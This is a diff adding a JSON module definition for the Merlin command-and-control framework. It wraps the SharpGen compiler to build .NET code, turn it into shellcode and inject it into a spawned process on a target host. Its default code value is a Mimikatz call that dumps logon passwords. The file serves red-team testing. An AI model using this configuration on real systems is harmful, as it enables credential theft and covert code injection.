@@ -1,0 +1,35 @@
+{
+  "base": {
+    "name": "SharpGen",
+    "type": "extended",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Ryan Cobb (@cobbr)"],
+    "path": ["windows", "x64", "csharp", "misc", "SharpGen.json"],
+    "platform": "WINDOWS",
+    "arch": "x64",
+    "lang": "dotnet_core",
+    "privilege": false,
+    "remote": "",
+    "local": [""],
+    "options": [
+      {"name": "dotnetbin", "value": "dotnet", "required": true, "flag": "", "description":"The file path for the \"dotnet\" core executable. Use just executable name if in PATH variable "},
+      {"name": "sharpgenbin", "value": "data/src/cobbr/SharpGen/bin/release/netcoreapp2.1/SharpGen.dll", "required": true, "flag": "", "description":"Path to SharpGen DLL"},
+      {"name": "help", "value": "false", "required": false, "flag": "-h", "description":"Show help information"},
+      {"name": "file", "value": "output.exe", "required": true, "flag": "-f", "description":"The output file name (not the path)"},
+      {"name": "dotnet", "value": "", "required": false, "flag": "-d", "description":"The Dotnet Framework version to target (net35 or net40)"},
+      {"name": "output-kind", "value": "", "required": false, "flag": "-o", "description":"The OutputKind to use (dll or console)"},
+      {"name": "platform", "value": "", "required": false, "flag": "-p", "description":" The Platform to use (AnyCpy, x86, or x64)"},
+      {"name": "no-optimization", "value": "", "required": false, "flag": "-n", "description":"Don't use source code optimization"},
+      {"name": "assembly-name", "value": "", "required": false, "flag": "-a", "description":"The name of the assembly to be generated"},
+      {"name": "source-file", "value": "", "required": false, "flag": "-s", "description":"The source code to compile"},
+      {"name": "class-name", "value": "", "required": false, "flag": "-c", "description":"The name of the class to be generated"},
+      {"name": "confuse", "value": "", "required": false, "flag": "--confuse", "description":"The ConfuserEx ProjectFile configuration"},
+      {"name": "code", "value": "Console.WriteLine(Mimikatz.LogonPasswords());", "required": false, "flag": "", "description":"CSharp code to compile"},
+      {"name": "verbose", "value": "", "required": false, "flag": "", "description":"Show dotnet compilation output"},
+      {"name": "spawnto", "value":  "C:\\WIndows\\System32\\dllhost.exe", "required":  true, "flag": "", "description": "The file path to the executable that will be spawned and the shellcode will be injected into"},
+      {"name": "args", "value":  "", "required":  false, "flag": "", "description": "Arguments for the spawnto process. They will actually be used"}
+    ],
+    "description": "SharpGen is a .NET Core console application that utilizes the Rosyln C# compiler to quickly cross-compile .NET Framework console applications or libraries.\r\n\tGitHub: https://github.com/cobbr/SharpGen\r\n\tIntroductory blog post: https://cobbr.io/SharpGen.html.\r\n\tThe generated .NET assembly will be converted to shellcode and executed on target host in the spawnto process.",
+    "notes": "This module is based on Ryan Cobb's SharpGen projects at https://github.com/cobbr/SharpGen.\r\n\t.NET CORE 2.1 SDK must ALREADY be installed on the Merlin server: https://dotnet.microsoft.com/download/dotnet-core/2.1.\r\n\tThe SharpGen DLL must be built ahead of time. This can be done by issuing the 'dotnet build -c release' command from the 'data/src/cobbr/SharpGen' directory to build the `SharpGen.dll` executable.\r\n\tSharpGen can be run on other operating systems such as Linux and macOS.\r\n\tView the SharpSploit API reference for additional commands at: https://sharpsploit.cobbr.io/api/index.html"
+  }
+}
